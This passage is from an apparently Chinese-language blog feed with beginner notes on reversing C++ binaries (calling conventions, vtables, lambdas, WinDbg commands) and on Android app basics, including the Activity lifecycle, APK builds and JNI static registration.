class="string">&quot;hello world&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	a = <span class="number">10</span>;</span><br><span class="line">	std::cout &lt;&lt; <span class="built_in">func</span>(a, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>) &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>带符号表的反汇编，可以看出其比较长的 namespace 和 函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  std::ostream *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(&amp;_4C11826D_reverse_cpp);</span><br><span class="line">  v0 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(std::cout, <span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v0, std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v1 = <span class="built_in">func</span>(<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>);</span><br><span class="line">  v2 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(std::cout, v1);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CALL-方式"><a href="#CALL-方式" class="headerlink" title="CALL 方式"></a>CALL 方式</h3><p>具体参考：<a href="https://learn.microsoft.com/zh-cn/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170">自变量传递和命名约定 | Microsoft Learn</a>****</p>
<p><strong><code>__cdecl</code></strong> 是 C 和 C++ 程序的默认调用约定。 堆栈由<code>caller</code>清理,函数传递顺序 从右到左</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">method</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong><code>__stdcall</code></strong> 调用约定用于调用 Win32 API 函数。<code>callee</code>清理堆栈，函数传递方式 从右到左。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WINAPI __stdcall</span></span><br><span class="line"><span class="function"><span class="type">void</span> __stdcall <span class="title">method</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong><code>__fastcall</code></strong> 调用约定指定尽可能在寄存器中传递函数的自变量。 此调用约定仅适用于 x86 体系结构。参数传递</p>
<ul>
<li>x86 从左到右的顺序找到前两个 <code>DWORD</code> 或更小自变量将在 ECX 和 EDX 寄存器中传递；所有其他自变量在堆栈上从右向左传递。</li>
<li>x64 下是 rcx, rdx, r8, r9</li>
</ul>
<p><strong><code>__thiscall</code></strong> 的调用约定用于 x86 体系结构上的 C++ 类成员函数，<strong>特定于 Microsoft</strong> </p>
<p>比如说 call func 的 汇编代码，我在x64下是 fastcall</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000140011</span>CEE                 mov     [rbp+<span class="number">0F</span>0h+a], <span class="number">0</span>Ah</span><br><span class="line">.text:<span class="number">0000000140011</span>CF5                 mov     [rsp+<span class="number">130</span>h+g], <span class="number">7</span> ; g</span><br><span class="line">.text:<span class="number">0000000140011</span>CFD                 mov     [rsp+<span class="number">130</span>h+f], <span class="number">6</span> ; f</span><br><span class="line">.text:<span class="number">0000000140011</span>D05                 mov     [rsp+<span class="number">130</span>h+e], <span class="number">5</span> ; e</span><br><span class="line">.text:<span class="number">0000000140011</span>D0D                 mov     r9d, <span class="number">4</span>          ; d</span><br><span class="line">.text:<span class="number">0000000140011</span>D13                 mov     r8d, <span class="number">3</span>          ; c</span><br><span class="line">.text:<span class="number">0000000140011</span>D19                 mov     edx, <span class="number">2</span>          ; b</span><br><span class="line">.text:<span class="number">0000000140011</span>D1E                 mov     ecx, [rbp+<span class="number">0F</span>0h+a] ; a</span><br><span class="line">.text:<span class="number">0000000140011</span>D21                 call    j_?func@@YAHHHHHHHH@Z ; <span class="built_in">func</span>(<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>)</span><br></pre></td></tr></table></figure>

<p>但是在 x86 就是 cdecl call</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0041253</span>C                 push    <span class="number">7</span>               ; g</span><br><span class="line">.text:<span class="number">0041253</span>E                 push    <span class="number">6</span>               ; f</span><br><span class="line">.text:<span class="number">00412540</span>                 push    <span class="number">5</span>               ; e</span><br><span class="line">.text:<span class="number">00412542</span>                 push    <span class="number">4</span>               ; d</span><br><span class="line">.text:<span class="number">00412544</span>                 push    <span class="number">3</span>               ; c</span><br><span class="line">.text:<span class="number">00412546</span>                 push    <span class="number">2</span>               ; b</span><br><span class="line">.text:<span class="number">00412548</span>                 mov     eax, [ebp+a]</span><br><span class="line">.text:<span class="number">0041254B</span>                 push    eax             ; a</span><br><span class="line">.text:<span class="number">0041254</span>C                 call    j_?func@@YAHHHHHHHH@Z ; <span class="built_in">func</span>(<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>)</span><br></pre></td></tr></table></figure>

<p>但是不变的是 <code>rax</code> 为函数返回值</p>
<h2 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h2><p>测试代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> _age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		_age = <span class="number">0</span>;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;person&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">Person</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~person&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">int</span> <span class="title">GetAge</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">SetAge</span><span class="params">(<span class="type">int</span> age)</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Boy</span> : <span class="keyword">public</span> Person &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Boy</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;boy&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">Boy</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~boy&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">GetAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;boy getage&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">114</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">SetAge</span><span class="params">(<span class="type">int</span> age)</span> </span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;boy setage&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	std::vector&lt;Boy&gt; boys;</span><br><span class="line">	Boy b;</span><br><span class="line">	boys.<span class="built_in">push_back</span>(b);</span><br><span class="line">	<span class="keyword">auto</span> f = [](<span class="type">int</span> a, <span class="type">int</span> b) -&gt; <span class="type">int</span> &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;lambda&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="keyword">return</span> a + b;</span><br><span class="line">		&#125;;</span><br><span class="line">	std::cout &lt;&lt; <span class="built_in">f</span>(<span class="number">1</span>, <span class="number">2</span>) &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>C++ 名称粉碎机制：举个例子 <code>std::cout</code> 名字是 <code>__imp_?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A:qword</code>。</p>
<ul>
<li>更好的重载</li>
</ul>
<p><code>MSVC</code> 反编译出来，优化比较严重，因此使用<code>g++</code></p>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>析构函数和构造函数</p>
<p>构造函数调用：函数声明时；析构函数：生命周期结束时</p>
<p>反汇编时，方法第一个参数一般是 <code>this</code> 指针</p>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>在构造时，构造顺序为先构造父类，后构造子类。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">Boy::Boy</span><span class="params">(Boy *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  Person::<span class="built_in">Person</span>(<span class="keyword">this</span>);</span><br><span class="line">  *(_QWORD *)<span class="keyword">this</span> = off_4CC8;   <span class="comment">// 虚指针</span></span><br><span class="line">  v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;boy&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在析构时，析构顺序为先析构子类，后析构父类。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall Boy::~<span class="built_in">Boy</span>(Boy *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)<span class="keyword">this</span> = off_4CC8; <span class="comment">// vfptr</span></span><br><span class="line">  v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;~boy&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  Person::~<span class="built_in">Person</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h3><p>虚函数也是函数，体现了CPP的多态性。</p>
<p>根据对象的实际类型来调用成员函数，而不是根据指针的类型来对该块内存进行解释并调用属于该指针类型所属的成员函数，简化代码实现多态性</p>
<ul>
<li>一个很好的解释：父类声明子类<code>Set&lt;String&gt; m = new HashMap&lt;String&gt;</code>，但是调用方法是子类的</li>
</ul>
<p>在<code>cpp</code>中使用一个指针和一个表格来进行实现的。这个表格称为虚表<code>vftable</code> ，这个指针称为虚表指针。</p>
<ul>
<li>如果一个类中有虚函数，编译器则会在对象的首部加入虚表指针，以存放所属于该对象的虚表</li>
</ul>
<p>虚表指针的填充时机：<strong>只有在构造函数和析构函数中会对虚表指针重新赋值，其他位置没有对该指针的操作</strong>。</p>
<ul>
<li>虚函数在类的首部</li>
</ul>
<p>其在构造函数和析构函数给<code>vfptr</code>赋值</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CC8 off_4CC8        dq offset _ZN3BoyD2Ev   ; DATA XREF: Boy::<span class="built_in">Boy</span>(<span class="type">void</span>)+<span class="number">1</span>D↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CC8                                         ; Boy::~<span class="built_in">Boy</span>()+<span class="number">10</span>↑o ...</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CC8                                         ; Boy::~<span class="built_in">Boy</span>()</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CD0                 dq offset _ZN3BoyD0Ev   ; Boy::~<span class="built_in">Boy</span>()</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CD8                 dq offset _ZN3Boy6GetAgeEv ; Boy::<span class="built_in">GetAge</span>(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CE0                 dq offset _ZN3Boy6SetAgeEi ; Boy::<span class="built_in">SetAge</span>(<span class="type">int</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CE8                 <span class="keyword">public</span> _ZTV6Person ; weak</span><br></pre></td></tr></table></figure>

<p><strong>析构函数为什么也要重新给虚表赋值呢？</strong></p>
<ul>
<li>编译器无法预知这个子类以后是否会被其他类继承，如果被继承，就成了父类，在执行析构函数时会先执行当前对象的析构函数，然后向祖父类的方向按继承线路逐层调用各类析构函数，当前对象的析构函数开始执行时，其虚表也是当前对象的，所以执行到父类的析构函数时，虚表必须改写为父类的虚表</li>
</ul>
<h2 id="lambda-表达式"><a href="#lambda-表达式" class="headerlink" title="lambda 表达式"></a>lambda 表达式</h2><p>比较简单的lambda 可以看出来其参数类型与个数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">v3 = main::&#123;<span class="built_in">lambda</span>(<span class="type">int</span>,<span class="type">int</span>)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(&amp;v6, <span class="number">1LL</span>, <span class="number">2LL</span>);</span><br><span class="line"> </span><br><span class="line">__int64 __fastcall main::&#123;<span class="built_in">lambda</span>(<span class="type">int</span>,<span class="type">int</span>)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(__int64 a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;lambda&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)(a2 + a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="debugger"><a href="#debugger" class="headerlink" title="debugger"></a>debugger</h2><p>WinDbg 命令：<a href="http://windbg.info/doc/1-common-cmds.html">Common WinDbg Commands </a><br>x64dbg 文档：<a href="https://help.x64dbg.com/en/latest/">  x64dbg documentation</a> </p>
<p>windbg 常见命令，感觉 preview 更加好看</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 断点 b</span></span><br><span class="line">bp: 断点</span><br><span class="line">bl: list</span><br><span class="line">bc: clear</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看 display/dump</span></span><br><span class="line">d&#123;a|b|c|d|D|f|p|q|u|w|W&#125; [Options] [Range]</span><br><span class="line">db: dump byte</span><br><span class="line">dw: word</span><br><span class="line">dd: dword</span><br><span class="line">dq: qword</span><br><span class="line">dt: type</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单步执行</span></span><br><span class="line">g: go</span><br><span class="line">t: trace，步入</span><br><span class="line">p: 步过</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看寄存器</span></span><br><span class="line">r: <span class="keyword">register</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用栈</span></span><br><span class="line">k: dump stack</span><br><span class="line">.frame</span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索</span></span><br><span class="line">s: search</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改</span></span><br><span class="line">e: edit</span><br></pre></td></tr></table></figure>

<p>某些命令</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.echo </span><br><span class="line">.reboot</span><br><span class="line">.reload</span><br><span class="line">.cls: 清屏幕</span><br><span class="line">.help</span><br></pre></td></tr></table></figure>


<p>x64dbg 操作起来比较容易，可以使用鼠标和右键😋。除了某些命令</p>
]]></content>
      <categories>
        <category>REVERSE</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-2</title>
    <url>/2023/10/18/Android-2/</url>
    <content><![CDATA[<blockquote>
<p>安卓新人😋</p>
</blockquote>
<span id="more"></span>

<h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><ol>
<li>Android Studio 创建一个项目，等待gradle</li>
<li>想要run起来，创建一个device。在Android Studio顶栏，device manager -&gt; create.</li>
</ol>
<ul>
<li>什么都先选第一个，缺什么东西使用IDE下载</li>
</ul>
<h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><p>Activity代表了一个具有用户界面的单一屏幕</p>
<p>Android 初始化是通过 Activity 中的 onCreate() 回调的调用开始的。存在有一序列的回调方法来启动一个活动，同时有一序列的方法来关闭活动</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>onCreate()</td>
<td>这是第一个回调，在活动第一次创建时调用</td>
</tr>
<tr>
<td>onStart()</td>
<td>这个回调在活动为用户可见时被调用</td>
</tr>
<tr>
<td>onResume()</td>
<td>这个回调在应用程序与用户开始可交互的时候调用</td>
</tr>
<tr>
<td>onPause()</td>
<td>被暂停的活动无法接受用户输入，不能执行任何代码。当前活动将要被暂停，上一个活动将要被恢复时调用</td>
</tr>
<tr>
<td>onStop()</td>
<td>当活动不在可见时调用</td>
</tr>
<tr>
<td>onDestroy()</td>
<td>当活动被系统销毁之前调用</td>
</tr>
<tr>
<td>onRestart()</td>
<td>当活动被停止以后重新打开时调用</td>
</tr>
</tbody></table>
<h3 id="bundle"><a href="#bundle" class="headerlink" title="bundle"></a>bundle</h3><p>Bundle主要用于<strong>传递数据</strong>：它保存的数据，是以key-value(键值对)的形式存在的。</p>
<p>我们经常使用<em>Bundle在Activity之间传递数据</em>，传递的数据可以是boolean、byte、int、long、float、double、string等基本类型或它们对应的数组，也可以是对象或对象数组。当Bundle传递的是对象或对象数组时，实现Serializable 或 Parcelable 接口。</p>
<h3 id="常见组件"><a href="#常见组件" class="headerlink" title="常见组件"></a>常见组件</h3><ol>
<li>onclick：点击事件</li>
<li>button：按钮</li>
<li>EditText：<br>编辑文本控件<br>编辑框（EditText）是TextView 的子类，在TextView 的基础上增加了文本编辑功能，用于处理用户输入，例如登录框等，是非常常用的组件。</li>
</ol>
<h3 id="APK"><a href="#APK" class="headerlink" title="APK"></a>APK</h3><p>android 创建一个空项目，打开hello xxx。先不在意细节，直接编译，可以直接运行（创建一个模拟器）</p>
<p>打包成APK文件：</p>
<ol>
<li>Build -&gt; Build Bundles&#x2F;Apks -&gt; Build APKs</li>
<li>Build -&gt; Make Project 然后在执行1</li>
<li>路径 app&#x2F;build&#x2F;outputs&#x2F;apk</li>
</ol>
<p>如果是debug版本，需要更改 build variants 为 release</p>
<p>然后就可以在jadx中反编译看看。</p>
<h2 id="Native"><a href="#Native" class="headerlink" title="Native"></a>Native</h2><ol>
<li>Android Studio选择创建一个native C++ 项目，等待gradle</li>
<li>出现一个 <code>cpp</code> 的文件夹，这就是我们需要写的库。同时存在java文件夹</li>
</ol>
<ul>
<li>device创建或者使用已经存在的</li>
</ul>
<ol start="3">
<li>Java层导入库</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123; System.loadLibrary(<span class="string">&quot;xxx&quot;</span>); &#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>在Java代码中出现如下的方法</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">demo</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<h3 id="jni-h"><a href="#jni-h" class="headerlink" title="jni.h"></a>jni.h</h3><blockquote>
<p>在android ndk 下可以找到，直接采使用 find 命令找。</p>
</blockquote>
<ol>
<li>某些类型</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">void</span>*           jobject;</span><br><span class="line"><span class="keyword">typedef</span> jobject         jclass;</span><br><span class="line"><span class="keyword">typedef</span> jobject         jstring;</span><br><span class="line"><span class="keyword">typedef</span> jobject         jarray;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>JNIEnv 和 JavaVM声明，在C和C++ 用法不太相同。</li>
</ol>
<p>JNI 定义了两个关键数据结构，即<code>JavaVM</code>和<code>JNIEnv</code>。两者本质上都是指向函数表的二级指针。（在 C++ 版本中，它们是一些类，这些类具有指向函数表的指针，并具有每个通过该函数表间接调用的 JNI 函数的成员函数。）JavaVM 提供<code>调用接口</code>函数，您可以利用此类来函数创建和销毁 JavaVM。理论上，每个进程可以有多个 JavaVM，但 Android 只允许有一个。</p>
<p>JNIEnv 提供了大部分 JNI 函数。原生函数都会收到 JNIEnv 作为第一个参数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_JNIEnv</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_JavaVM</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span>* C_JNIEnv;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__cplusplus)</span></span><br><span class="line"><span class="keyword">typedef</span> _JNIEnv JNIEnv;</span><br><span class="line"><span class="keyword">typedef</span> _JavaVM JavaVM;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span>* JNIEnv;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span>* JavaVM;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>JavaVM 原型</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_JavaVM</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span>* functions;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__cplusplus)</span></span><br><span class="line">    <span class="function">jint <span class="title">DestroyJavaVM</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">DestroyJavaVM</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">AttachCurrentThread</span><span class="params">(JNIEnv** p_env, <span class="type">void</span>* thr_args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">AttachCurrentThread</span>(<span class="keyword">this</span>, p_env, thr_args); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">DetachCurrentThread</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">DetachCurrentThread</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">GetEnv</span><span class="params">(<span class="type">void</span>** env, jint version)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">GetEnv</span>(<span class="keyword">this</span>, env, version); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">AttachCurrentThreadAsDaemon</span><span class="params">(JNIEnv** p_env, <span class="type">void</span>* thr_args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">AttachCurrentThreadAsDaemon</span>(<span class="keyword">this</span>, p_env, thr_args); &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/*__cplusplus*/</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span> &#123;</span><br><span class="line">    <span class="type">void</span>*       reserved0;</span><br><span class="line">    <span class="type">void</span>*       reserved1;</span><br><span class="line">    <span class="type">void</span>*       reserved2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">jint</span>        (*DestroyJavaVM)(JavaVM*);</span><br><span class="line">    <span class="built_in">jint</span>        (*AttachCurrentThread)(JavaVM*, JNIEnv**, <span class="type">void</span>*);</span><br><span class="line">    <span class="built_in">jint</span>        (*DetachCurrentThread)(JavaVM*);</span><br><span class="line">    <span class="built_in">jint</span>        (*GetEnv)(JavaVM*, <span class="type">void</span>**, jint);</span><br><span class="line">    <span class="built_in">jint</span>        (*AttachCurrentThreadAsDaemon)(JavaVM*, JNIEnv**, <span class="type">void</span>*);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>JNIEnv</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span> &#123;</span><br><span class="line">   <span class="comment">// xxx 比较多</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>native method，签名有个具体的表</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* signature;</span><br><span class="line">    <span class="type">void</span>*       fnPtr;</span><br><span class="line">&#125; JNINativeMethod;</span><br></pre></td></tr></table></figure>

<h3 id="静态注册"><a href="#静态注册" class="headerlink" title="静态注册"></a>静态注册</h3><ol>
<li>静态注册的函数名一般为 <code>Java_包名_类名_函数名</code> 将包名中的 <code>.</code> 替换为 <code>_</code> 就是native层函数的名称</li>
<li>函数：从<code>jni.h</code> 可以看出，第一个是JNIEnv，第二个为jclass，然后就是Java层代码的参数</li>
<li>android studio 创建一个native C++ 默认为静态注册</li>
</ol>
<p>native-lib.cpp</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> </span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL  </span></span><br><span class="line"><span class="function"><span class="title">Java_com_learn_native_1lib_MainActivity_stringFromJNI</span><span class="params">(  </span></span></span><br><span class="line"><span class="params"><span class="function">        JNIEnv* env,  </span></span></span><br><span class="line"><span class="params"><span class="function">        jobject <span class="comment">/* this */</span>)</span> </span>&#123;  </span><br><span class="line">    std::string hello = <span class="string">&quot;Hello from C++&quot;</span>;  </span><br><span class="line">    <span class="keyword">return</span> env-&gt;<span class="built_in">NewStringUTF</span>(hello.<span class="built_in">c_str</span>());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>java层</p>
